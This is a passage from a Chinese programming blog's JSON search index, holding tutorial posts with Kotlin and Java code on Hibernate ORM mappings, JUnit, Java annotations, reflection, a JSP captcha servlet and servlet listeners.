name=\u0026#34;dialect\u0026#34;\u0026gt;org.hibernate.dialect.PostgreSQL95Dialect\u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;connection.url\u0026#34;\u0026gt;jdbc:postgresql://127.0.0.1:5432/postgres\u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;connection.driver_class\u0026#34;\u0026gt;org.postgresql.Driver\u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;connection.username\u0026#34;\u0026gt;123\u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;connection.password\u0026#34;\u0026gt;123456\u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;show_sql\u0026#34;\u0026gt;true\u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;format_sql\u0026#34;\u0026gt;false\u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;hbm2ddl.auto\u0026#34;\u0026gt;update\u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;current_session_context_class\u0026#34;\u0026gt;thread\u0026lt;/property\u0026gt; \u0026lt;mapping class=\u0026#34;entity.Student\u0026#34;/\u0026gt; 实体 \u0026lt;/session-factory\u0026gt; \u0026lt;/hibernate-configuration\u0026gt; hbm2ddl.auto（DDL 生成策略）： create：启动时重新创建表。 create-drop：启动时重新创建表，结束时再删除表。 update：启动时验证表结构，不一致时，更新表结构。 validate：启动时验证表结构，不一致时，抛出异常。 current_session_context_class ➜ thread ➜ org.hibernate.context.internal.ThreadLocalSessionContext 单表操作 entity Student package entity import java.util.* import javax.persistence.* JPA 注解 @Entity 实体 data class Student( @Id 主键 @GeneratedValue(strategy = GenerationType.IDENTITY) 主键整形自增（SERIAL） var id: Int? = null, var name: String? = null, var gender: String? = null, var birthday: Date? = null, var address: Address? = null, 组件 var picture: ByteArray? = null, @Transient 非字段 var temp: String? = null ) @Table(name = \u0026#34;t_student\u0026#34;) 定义表 @Column(nullable = false, columnDefinition = \u0026#34;timestamp|time|date\u0026#34;) 定义字段 @Temporal(TemporalType.DATE) timestamp 时间+日期 time 时间 date 日期 Address package entity import javax.persistence.Embeddable @Embeddable 组件 data class Address( var city: String? = null, var phone: String? = null, var postcode: String? = null ) A import entity.Address import entity.Student import org.hibernate.SessionFactory import org.hibernate.boot.MetadataSources import org.hibernate.boot.registry.StandardServiceRegistryBuilder import java.util.* val sessionFactory: SessionFactory by lazy { 会话工厂 val registry = StandardServiceRegistryBuilder().configure().build() MetadataSources(registry).buildMetadata().buildSessionFactory() } fun main(args: Array\u0026lt;String\u0026gt;) { create() retrieve() update() delete() sessionFactory.close() } fun create() { println(\u0026#34;增\u0026#34;) sessionFactory.currentSession.use { it.beginTransaction() 开启事务 val student = Student(name = \u0026#34;张三丰\u0026#34;, gender = \u0026#34;男\u0026#34;, birthday = Date(), address = Address(city = \u0026#34;重庆\u0026#34;)) it.save(student) it.transaction.commit() 提交事务 } openSession()：新建会话，会话需手动关闭。 getCurrentSession()：重用会话，会话会自动关闭。（需要配置 current_session_context_class） } fun retrieve() { println(\u0026#34;查\u0026#34;) sessionFactory.currentSession.use { it.beginTransaction() val student = it.get(Student::class.java, 1) println(student) it.transaction.commit() } get()：立即执行 SQL 语句，返回实体对象，记录不存在返回 null。（Eager） load()：延迟执行 SQL 语句，返回代理对象，记录不存在抛出 ObjectNotFoundException 异常。（Lazy） } fun update() { println(\u0026#34;改\u0026#34;) sessionFactory.currentSession.use { it.beginTransaction() val student = it.get(Student::class.java, 1)?.apply { this.gender = \u0026#34;女\u0026#34; } if (student != null) { it.update(student) } it.transaction.commit() } } fun delete() { println(\u0026#34;删\u0026#34;) sessionFactory.currentSession.use { it.beginTransaction() val student = it.get(Student::class.java, 1) if (student != null) { it.delete(student) } it.transaction.commit() } } 多表关联 一对一 只需持久化一方（Phone）。\n单向引用 import javax.persistence.* JPA 注解 @Entity data class Phone( 从表 @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, @Column(unique = true) 定义字段 var number: String? = null, @OneToOne(cascade = arrayOf(CascadeType.ALL), orphanRemoval = true) @JoinColumn(unique = true) 定义外键字段 var details: PhoneDetail? = null 将 PhoneDetail 的主键作为此表的外键 ) ---- @Entity data class PhoneDetail( 主表（与平常状态一致，无需改动） @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, var provider: String? = null ) 双向引用（优） @Entity data class Phone( 主表 @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, @Column(unique = true) var number: String? = null, @OneToOne(mappedBy = \u0026#34;phone\u0026#34;, cascade = arrayOf(CascadeType.ALL), orphanRemoval = true) var details: PhoneDetail? = null 由 PhoneDetail 中的 phone 负责关联 ) { fun addDetails(details: PhoneDetail) { 确保双方关系保持同步 this.details = details details.phone = this } fun removeDetails() { 确保双方关系保持同步 if (details != null) { this.details = null details?.phone = null } } } ---- @Entity data class PhoneDetail( 从表 @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, var provider: String? = null, @OneToOne @JoinColumn(unique = true) var phone: Phone? = null 将 Phone 的主键作为此表的外键 ) 一对多 只需持久化一方（Person）。\n单向引用（一方持有多方集合） 会生成中间表 Person_Phone 来关联两个实体。\n@Entity data class Person( @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, var name: String? = null, @OneToMany(cascade = arrayOf(CascadeType.ALL), orphanRemoval = true) val phones: MutableList\u0026lt;Phone\u0026gt; = arrayListOf() ) ---- @Entity data class Phone( 与平常状态一致，无需改动 @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, @Column(unique = true) var number: String? = null ) 多对一 因未设置级联属性，在不同事务中，需先持久化 主表 Person，后持久化从表 Phone。( 先主后从 )\n单向引用（多方持有一方引用） @Entity data class Person( 主表（与平常状态一致，无需改动） @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, var name: String? = null ) ---- @Entity data class Phone( 从表 @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, @Column(unique = true) var number: String? = null, @ManyToOne var person: Person? = null 将 Person 的主键作为此表的外键 ) 一（多）对多（一） 只需持久化一方（Person）。\n双向引用（优） @Entity data class Person( 主表 @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, var name: String? = null, @OneToMany(mappedBy = \u0026#34;person\u0026#34;, cascade = arrayOf(CascadeType.ALL), orphanRemoval = true) val phones: MutableList\u0026lt;Phone\u0026gt; = arrayListOf() 由 Phone 中的 person 负责关联 ) { fun addPhone(phone: Phone) { 确保双方关系保持同步 phones.add(phone) phone.person = this } fun removePhone(phone: Phone) { 确保双方关系保持同步 phones.remove(phone) phone.person = null } } ---- @Entity data class Phone( 从表 @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, @Column(unique = true) var number: String? = null, @ManyToOne var person: Person? = null 将 Person 的主键作为此表的外键 ) 多对多（略） Reference https://en.wikibooks.org/wiki/Java_Persistence/Relationships domain associations collections appendices Annotations BestPractices Configurations JPA API https://www.oracle.com/webfolder/technetwork/jsc/xml/ns/persistence/index.html https://www.oracle.com/technetwork/cn/middleware/ias/toplink-jpa-annotations-100895-zhs.html Annotations XML ","permalink":"https://xhstormr.github.io/blog/posts/hibernate/","summary":"","title":"Hibernate ORM"},{"content":"Updated on 2017-05-12\nhttps://github.com/junit-team/junit5\n工作原理 ABC import org.junit.*; public class ABC { @BeforeClass public static void A() { 静态方法 System.out.println(\u0026#34;A\u0026#34;); } @AfterClass public static void B() { 静态方法 System.out.println(\u0026#34;B\u0026#34;); } @Before public void a() { System.out.println(\u0026#34;a\u0026#34;); } @After public void b() { System.out.println(\u0026#34;b\u0026#34;); } @Test 测试用例 public void test1() { System.out.println(\u0026#34;test1\u0026#34;); Assert.assertEquals(2, 1 + 1); 断言（预期值，实际值） } @Test(expected = AssertionError.class) 预期异常 public void test2() { System.out.println(\u0026#34;test2\u0026#34;); Assert.fail(); 直接失败（抛出 AssertionError 异常） } @Test(timeout = 1000) 超时设置（单位：毫秒） public void test3() throws InterruptedException { System.out.println(\u0026#34;test3\u0026#34;); Thread.sleep(100); } @Ignore 忽略测试用例 @Test public void test4() { System.out.println(\u0026#34;test4\u0026#34;); Assert.assertEquals(1, 4 / 0); } } ---- 输出： A a test1 b a test2 b a test3 b Test ignored. B 测试套件 A import org.junit.Test; public class A { @Test public void test1() { System.out.println(\u0026#34;A.test1\u0026#34;); } @Test public void test2() { System.out.println(\u0026#34;A.test2\u0026#34;); } } B import org.junit.Test; public class B { @Test public void test1() { System.out.println(\u0026#34;B.test1\u0026#34;); } @Test public void test2() { System.out.println(\u0026#34;B.test2\u0026#34;); } } C import org.junit.Test; public class C { @Test public void test1() { System.out.println(\u0026#34;C.test1\u0026#34;); } @Test public void test2() { System.out.println(\u0026#34;C.test2\u0026#34;); } } ABC import org.junit.runner.RunWith; import org.junit.runners.Suite; @RunWith(Suite.class) @Suite.SuiteClasses({A.class, B.class, C.class}) public class ABC { 测试套件 } ---- 输出： A.test1 A.test2 B.test1 B.test2 C.test1 C.test2 参数设置 ABC import org.junit.Assert; import org.junit.Test; import org.junit.runner.RunWith; import org.junit.runners.Parameterized; import java.util.ArrayList; import java.util.List; @RunWith(Parameterized.class) public class ABC { private int output; private int input1; private int input2; public ABC(int output, int input1, int input2) { 构造方法（初始化参数） this.output = output; this.input1 = input1; this.input2 = input2; } @Parameterized.Parameters public static List provide() { 静态方法（提供参数） ArrayList\u0026lt;Object\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); list.add(new Object[]{2, 1, 1}); list.add(new Object[]{5, 3, 2}); list.add(new Object[]{8, 5, 3}); return list; } @Test public void test() { Assert.assertEquals(output, input1 + input2); System.out.printf(\u0026#34;Pass: %d = %d + %d\\n\u0026#34;, output, input1, input2); } } ---- 输出： Pass: 2 = 1 + 1 Pass: 5 = 3 + 2 Pass: 8 = 5 + 3 ","permalink":"https://xhstormr.github.io/blog/posts/junit/","summary":"","title":"JUnit"},{"content":"Updated on 2017-05-09\n注解 API\n元注解 负责注解注解的注解\n@Target（多个参数） 指示注解目标。\nElementType TYPE：类、接口、枚举、注解 FIELD：属性 METHOD：方法 CONSTRUCTOR：构造方法 PARAMETER：参数 LOCAL_VARIABLE：变量 ANNOTATION_TYPE：注解 PACKAGE：包 @Retention（一个参数） 指示生命周期。\nRetentionPolicy SOURCE ：源代码，源码 注解。 CLASS ：字节码，编译 注解，注解在虚拟机 运行时被忽略。（缺省行为） RUNTIME：字节码，运行 注解，注解在虚拟机 运行时被保留，因此 可通过反射读取。 @Inherited（标识注解） 指示 自动继承 此注解。（仅对类注解有效）\n@Documented（标识注解） 指示 文档包含 此注解。\nCode @User import java.lang.annotation.*; @Target({ElementType.METHOD, ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @Inherited @Documented public @interface User { String name(); int age() default 15; String description() default \u0026#34;Description\u0026#34;; } A import java.lang.reflect.Method; @User(name = \u0026#34;Mack\u0026#34;, age = 18) public class A { @User(name = \u0026#34;Jack\u0026#34;, age = 27) public static void main(String[] args) { Class\u0026lt;A\u0026gt; c = A.class; boolean b; b = c.isAnnotationPresent(User.class); if (b) { System.out.print(\u0026#34;类注解：\u0026#34;); User user = c.getAnnotation(User.class); show(user); } Method[] methods = c.getDeclaredMethods(); for (Method method : methods) { b = method.isAnnotationPresent(User.class); if (b) { System.out.print(\u0026#34;方法注解：\u0026#34;); User user = method.getAnnotation(User.class); show(user); } } } @User(name = \u0026#34;Dave\u0026#34;) private static void show(User user) { int age = user.age(); String name = user.name(); String description = user.description(); System.out.printf(\u0026#34;%s %d %s\\n\u0026#34;, name, age, description); } } ---- 输出： 类注解：Mack 18 Description 方法注解：Jack 27 Description 方法注解：Dave 15 Description @Table import java.lang.annotation.ElementType; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; @Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) public @interface Table { String value(); } @Column import java.lang.annotation.ElementType; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; @Target(ElementType.FIELD) @Retention(RetentionPolicy.RUNTIME) public @interface Column { String value(); } Filter @Table(\u0026#34;user\u0026#34;) public class Filter { @Column(\u0026#34;id\u0026#34;) private Object o1; @Column(\u0026#34;age\u0026#34;) private Object o2; @Column(\u0026#34;name\u0026#34;) private Object o3; @Column(\u0026#34;city\u0026#34;) private Object o4; @Column(\u0026#34;email\u0026#34;) private Object o5; private Object o6; public Object getO1() { return o1; } public void setO1(Object o1) { this.o1 = o1; } public Object getO2() { return o2; } public void setO2(Object o2) { this.o2 = o2; } public Object getO3() { return o3; } public void setO3(Object o3) { this.o3 = o3; } public Object getO4() { return o4; } public void setO4(Object o4) { this.o4 = o4; } public Object getO5() { return o5; } public void setO5(Object o5) { this.o5 = o5; } public Object getO6() { return o6; } public void setO6(Object o6) { this.o6 = o6; } } A import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class A { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { Filter filter1 = new Filter(); filter1.setO2(10); filter1.setO3(\u0026#34;Tom\u0026#34;); Filter filter2 = new Filter(); filter2.setO1(1); filter2.setO4(\u0026#34;Chongqing\u0026#34;); System.out.println(query(filter1)); System.out.println(query(filter2)); } private static String query(Filter filter) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { Class\u0026lt;? extends Filter\u0026gt; c = filter.getClass(); boolean b = c.isAnnotationPresent(Table.class); if (!b) { return null; } StringBuilder sb = new StringBuilder(); Table table = c.getAnnotation(Table.class); String s = table.value(); sb.append(\u0026#34;select * from \u0026#34;).append(s).append(\u0026#34; where 1=1\u0026#34;); Field[] fields = c.getDeclaredFields(); for (Field field : fields) { b = field.isAnnotationPresent(Column.class); if (!b) { continue; } String fieldName = field.getName(); s = \u0026#34;get\u0026#34; + fieldName.substring(0, 1).toUpperCase() + fieldName.substring(1); Method method = c.getMethod(s); Object fieldValue = method.invoke(filter); if (fieldValue == null) { continue; } Column column = field.getAnnotation(Column.class); String columnName = column.value(); if (fieldValue instanceof String) { sb.append(\u0026#34; and \u0026#34;).append(columnName).append(\u0026#34;=\u0026#34;).append(\u0026#39;\\\u0026#39;\u0026#39;).append(fieldValue).append(\u0026#39;\\\u0026#39;\u0026#39;); } else { sb.append(\u0026#34; and \u0026#34;).append(columnName).append(\u0026#34;=\u0026#34;).append(fieldValue); } } return sb.append(\u0026#39;;\u0026#39;).toString(); } } ---- 输出： select * from user where 1=1 and age=10 and name=\u0026#39;Tom\u0026#39;; select * from user where 1=1 and id=1 and city=\u0026#39;Chongqing\u0026#39;; ","permalink":"https://xhstormr.github.io/blog/posts/java-annotation/","summary":"","title":"Java Annotation"},{"content":"Updated on 2017-05-08\n反射 API\nClass 对象 类是 java.lang.Class 的实例对象。\npackage a; public class A { public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException { 编译时刻就加载类（静态加载） Class\u0026lt;? extends A\u0026gt; c1 = new A().getClass(); 通过实例对象获得 Class 对象 Class\u0026lt;A\u0026gt; c2 = A.class; 通过静态成员获得 Class 对象 运行时刻才加载类（动态加载） Class\u0026lt;?\u0026gt; c3 = Class.forName(\u0026#34;a.A\u0026#34;); 动态加载类（可能会抛出 ClassNotFoundException 异常） System.out.println(c1); System.out.println(c2); System.out.println(c3); System.out.println(c1.getName()); 获得完全类名限定符 System.out.println(c1.getSimpleName()); 获得类名 System.out.println(c1 == c2); System.out.println(c2 == c3); A a = c1.newInstance(); 通过 Class 对象实例化类（需要有无参构造方法） A a = new A(); a 是 A 的实例对象 Class\u0026lt;A\u0026gt; c = A.class; c 是 Class 的实例对象 } } ---- 输出： class a.A class a.A class a.A a.A A true true Java 中的静态成员和基本数据类型不是面向对象的。 Method 对象 package a; import java.lang.reflect.Method; import java.util.Arrays; public class A { public static void main(String[] args) { Class\u0026lt;A\u0026gt; c = A.class; Method[] methods1 = c.getMethods(); 获得所有公有的方法（包括继承） Method[] methods2 = c.getDeclaredMethods(); 获得所有自己的方法（包括私有） show(methods1); System.out.println(); show(methods2); } private static void show(Method[] methods) { for (Method method : methods) { String methodName = method.getName(); 获得方法名 String returnTypeName = method.getReturnType().getSimpleName(); 获得返回类型的类名 Class\u0026lt;?\u0026gt;[] parameterTypes = method.getParameterTypes(); 获得参数类型 System.out.println(methodName + \u0026#34; \u0026#34; + returnTypeName + \u0026#34; \u0026#34; + Arrays.toString(parameterTypes)); } } } ---- 输出： main void [class [Ljava.lang.String;] wait void [] wait void [long, int] wait void [long] equals boolean [class java.lang.Object] toString String [] hashCode int [] getClass Class [] notify void [] notifyAll void [] main void [class [Ljava.lang.String;] show void [class [Ljava.lang.reflect.Method;] Method Invoke package a; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class A { public static void main(String[] args) throws IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException { Class\u0026lt;A\u0026gt; c = A.class; A a = c.newInstance(); 通过 Class 对象实例化类（需要有无参构造方法） Method print1 = c.getMethod(\u0026#34;print\u0026#34;); 获得公有方法 Method print2 = c.getMethod(\u0026#34;print\u0026#34;, int.class); Method print3 = c.getDeclaredMethod(\u0026#34;print\u0026#34;, String.class); 获得私有方法 // a.print(); 正常调用方法 // a.print(1); // a.print(\u0026#34;A\u0026#34;); Object o1 = print1.invoke(a); 反射调用方法（无返回值为 null） Object o2 = print2.invoke(a, 1); Object o3 = print3.invoke(a, \u0026#34;A\u0026#34;); System.out.println(o1); System.out.println(o2); System.out.println(o3); 正常调用方法：A.B(C); 反射调用方法：B.invoke(A,C); } public void print() { System.out.println(\u0026#34;A\u0026#34;); } public String print(int i) { System.out.println(\u0026#34;B\u0026#34;); return \u0026#34;B\u0026#34;; } private void print(String s) { System.out.println(\u0026#34;C\u0026#34;); } } ---- 输出： A B C null B null Field 对象 package a; import java.lang.reflect.Field; import java.lang.reflect.Modifier; public class A { public static void main(String[] args) { Class\u0026lt;String\u0026gt; c = String.class; Field[] fields1 = c.getFields(); 获得所有公有的属性（包括继承） Field[] fields2 = c.getDeclaredFields(); 获得所有自己的属性（包括私有） show(fields1); System.out.println(); show(fields2); } private static void show(Field[] fields) { for (Field field : fields) { String fieldName = field.getName(); 获得属性名 String fieldTypeName = field.getType().getSimpleName(); 获得属性类型的类名 String modifiers = Modifier.toString(field.getModifiers()); 获得访问修饰符 System.out.println(fieldName + \u0026#34; \u0026#34; + fieldTypeName); } } } ---- 输出： CASE_INSENSITIVE_ORDER Comparator value char[] hash int serialVersionUID long serialPersistentFields ObjectStreamField[] CASE_INSENSITIVE_ORDER Comparator Constructor 对象 package a; import java.lang.reflect.Constructor; import java.util.Arrays; public class A { public static void main(String[] args) { Class\u0026lt;Integer\u0026gt; c = Integer.class; Constructor\u0026lt;?\u0026gt;[] constructors1 = c.getConstructors(); 获得所有公有构造方法 Constructor\u0026lt;?\u0026gt;[] constructors2 = c.getDeclaredConstructors(); 获得所有构造方法（包括私有） show(constructors1); System.out.println(); show(constructors2); } private static void show(Constructor\u0026lt;?\u0026gt;[] constructors) { for (Constructor\u0026lt;?\u0026gt; constructor : constructors) { String constructorName = constructor.getName(); 获得方法名 Class\u0026lt;?\u0026gt;[] parameterTypes = constructor.getParameterTypes(); 获得参数类型 System.out.println(constructorName + \u0026#34; \u0026#34; + Arrays.toString(parameterTypes)); } } } ---- 输出： java.lang.Integer [int] java.lang.Integer [class java.lang.String] java.lang.Integer [int] java.lang.Integer [class java.lang.String] 通过反射理解泛型本质 反射的操作都是在运行时刻进行。 编译之后的集合会去掉泛型约束。 泛型约束只在编译阶段有效。 绕过编译 ➜ 绕过泛型。 import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.ArrayList; public class A { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { ArrayList\u0026lt;Integer\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); list.add(1); // list.add(\u0026#34;A\u0026#34;); 错误（泛型约束） System.out.println(list); Class\u0026lt;? extends ArrayList\u0026gt; c = list.getClass(); Method add = c.getMethod(\u0026#34;add\u0026#34;, Object.class); add.invoke(list, \u0026#34;A\u0026#34;); System.out.println(list); } } ---- 输出： [1] [1, A] ","permalink":"https://xhstormr.github.io/blog/posts/java-reflect/","summary":"","title":"Java Reflect"},{"content":"Updated on 2017-05-05\n生成验证码并验证 原生 JSP index.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;A\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img id=\u0026#34;checkImg\u0026#34; src=\u0026#34;./abc\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;javascript:a()\u0026#34;\u0026gt;看不清!\u0026lt;/a\u0026gt; \u0026lt;form action=\u0026#34;./def\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; 验证码: \u0026lt;input name=\u0026#34;checkCode\u0026#34; type=\u0026#34;text\u0026#34; maxlength=\u0026#34;4\u0026#34; size=\u0026#34;4\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; function a() { document.getElementById(\u0026#34;checkImg\u0026#34;).src = \u0026#34;./abc?\u0026#34; + new Date().getTime(); URL 附上时间戳，来改变网址，避免缓存 } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; MyServlet1 package a import java.awt.Color import java.awt.Font import java.awt.image.BufferedImage import java.util.* import javax.imageio.ImageIO import javax.servlet.annotation.WebServlet import javax.servlet.http.HttpServlet import javax.servlet.http.HttpServletRequest import javax.servlet.http.HttpServletResponse @WebServlet(urlPatterns = arrayOf(\u0026#34;/abc\u0026#34;)) class MyServlet1 : HttpServlet() { 生成 val random = Random() val strings = \u0026#34;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; override fun doGet(request: HttpServletRequest, response: HttpServletResponse) { val image = BufferedImage(70, 25, BufferedImage.TYPE_INT_RGB) 图片 val graphics = image.graphics.apply { 获得画笔 this.font = Font(\u0026#34;Microsoft YaHei UI\u0026#34;, Font.PLAIN, 18) 设置字体 this.color = Color(200, 150, 255) 设置画笔颜色（R,G,B） this.fillRect(0, 0, 70, 25) 填充矩形 } val checkCode = StringBuilder() for (i in 0..3) { 4 次（0,1,2,3） val c = strings[random.nextInt(strings.length)] 随机获取字符 graphics.color = Color(random.nextInt()) 设置画笔颜色 graphics.drawString(c.toString(), (i * 16) + 5, 20) 画出字符 checkCode.append(c) 添加字符 } request.session.setAttribute(\u0026#34;checkCode\u0026#34;, checkCode) 将验证码保存至 Session 中 ImageIO.write(image, \u0026#34;PNG\u0026#34;, response.outputStream) 将图片输出至 Response } } MyServlet2 package a import javax.servlet.annotation.WebServlet import javax.servlet.http.HttpServlet import javax.servlet.http.HttpServletRequest import javax.servlet.http.HttpServletResponse @WebServlet(urlPatterns = arrayOf(\u0026#34;/def\u0026#34;)) class MyServlet2 : HttpServlet() { 验证 override fun doPost(request: HttpServletRequest, response: HttpServletResponse) { request.characterEncoding = \u0026#34;UTF-8\u0026#34; 指定输入字符集 response.characterEncoding = \u0026#34;UTF-8\u0026#34; 指定输出字符集 response.contentType = \u0026#34;text/html;charset=UTF-8\u0026#34; 指定输出内容类型 val temp1 = request.session.getAttribute(\u0026#34;checkCode\u0026#34;)?.toString()?.toLowerCase() val temp2 = request.getParameter(\u0026#34;checkCode\u0026#34;).toString().toLowerCase() if (temp1 == temp2) { 将接收到的验证码和 Session 中的验证码进行比较 response.writer.use { it.write(\u0026#34;$temp1 : $temp2 \u0026lt;br\u0026gt;验证码输入正确!\u0026#34;) } } else { response.writer.use { it.write(\u0026#34;$temp1 : $temp2 \u0026lt;br\u0026gt;验证码输入错误!\u0026#34;) } } } } 使用开源组件 kaptcha compile \u0026#39;com.github.penggle:kaptcha:2.3.2\u0026#39; JSP index.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;A\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img id=\u0026#34;checkImg\u0026#34; src=\u0026#34;./abc\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;javascript:a()\u0026#34;\u0026gt;看不清!\u0026lt;/a\u0026gt; \u0026lt;form action=\u0026#34;./def\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; 验证码: \u0026lt;input name=\u0026#34;checkCode\u0026#34; type=\u0026#34;text\u0026#34; maxlength=\u0026#34;5\u0026#34; size=\u0026#34;5\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; function a() { document.getElementById(\u0026#34;checkImg\u0026#34;).src = \u0026#34;./abc?\u0026#34; + new Date().getTime(); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; MyServlet package a import javax.servlet.annotation.WebServlet import javax.servlet.http.HttpServlet import javax.servlet.http.HttpServletRequest import javax.servlet.http.HttpServletResponse @WebServlet(urlPatterns = arrayOf(\u0026#34;/def\u0026#34;)) class MyServlet : HttpServlet() { 验证 override fun doPost(request: HttpServletRequest, response: HttpServletResponse) { request.characterEncoding = \u0026#34;UTF-8\u0026#34; response.characterEncoding = \u0026#34;UTF-8\u0026#34; response.contentType = \u0026#34;text/html;charset=UTF-8\u0026#34; val temp1 = request.session.getAttribute(com.google.code.kaptcha.Constants.KAPTCHA_SESSION_KEY)?.toString()?.toLowerCase() val temp2 = request.getParameter(\u0026#34;checkCode\u0026#34;).toString().toLowerCase() if (temp1 == temp2) { response.writer.use { it.write(\u0026#34;$temp1 : $temp2 \u0026lt;br\u0026gt;验证码输入正确!\u0026#34;) } } else { response.writer.use { it.write(\u0026#34;$temp1 : $temp2 \u0026lt;br\u0026gt;验证码输入错误!\u0026#34;) } } } } web.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd\u0026#34; version=\u0026#34;3.1\u0026#34;\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;a\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.google.code.kaptcha.servlet.KaptchaServlet\u0026lt;/servlet-class\u0026gt; 生成 \u0026lt;!-- 中文验证码 --\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;kaptcha.textproducer.impl\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;com.google.code.kaptcha.text.impl.ChineseTextProducer\u0026lt;/param-value\u0026gt; 配置为中文验证码 \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;kaptcha.textproducer.font.names\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;Microsoft YaHei UI\u0026lt;/param-value\u0026gt; 配置字体 \u0026lt;/init-param\u0026gt; \u0026lt;!-- 中文验证码 --\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;a\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/abc\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/jsp-practice/","summary":"","title":"JSP 实例"},{"content":"Updated on 2017-05-02\n工作原理 用于监听 ServletContext、ServletRequest、HttpSession 等对象的创建、销毁以及属性增删事件。\n按监听对象划分 ServletContext（application） ServletContextListener ServletContextAttributeListener ServletRequest（request） ServletRequestListener ServletRequestAttributeListener HttpSession（session） HttpSessionListener HttpSessionAttributeListener JavaBean HttpSessionBindingListener（绑定 - 解绑） HttpSessionActivationListener（钝化 - 活化） 按监听事件划分 对象的创建与销毁 ServletContextListener ServletRequestListener HttpSessionListener 属性的增加、删除与替换 ServletContextAttributeListener ServletRequestAttributeListener HttpSessionAttributeListener 绑定至 HttpSession 中属性状态的改变 HttpSessionBindingListener（绑定 - 解绑） HttpSessionActivationListener（钝化 - 活化） User package a import java.io.Serializable import javax.servlet.http.HttpSessionActivationListener import javax.servlet.http.HttpSessionBindingEvent import javax.servlet.http.HttpSessionBindingListener import javax.servlet.http.HttpSessionEvent data class User(val name: String = \u0026#34;Tom\u0026#34;) : HttpSessionBindingListener, HttpSessionActivationListener, Serializable { override fun valueBound(event: HttpSessionBindingEvent) { println(\u0026#34;实体绑定：${event.name} :: ${event.value}\u0026#34;) } override fun valueUnbound(event: HttpSessionBindingEvent) { println(\u0026#34;实体解绑：${event.name} :: ${event.value}\u0026#34;) } override fun sessionWillPassivate(se: HttpSessionEvent) { println(\u0026#34;会话序列化（钝化）：\u0026#34; + se.session) } override fun sessionDidActivate(se: HttpSessionEvent) { println(\u0026#34;会话反序列化（活化）：\u0026#34; + 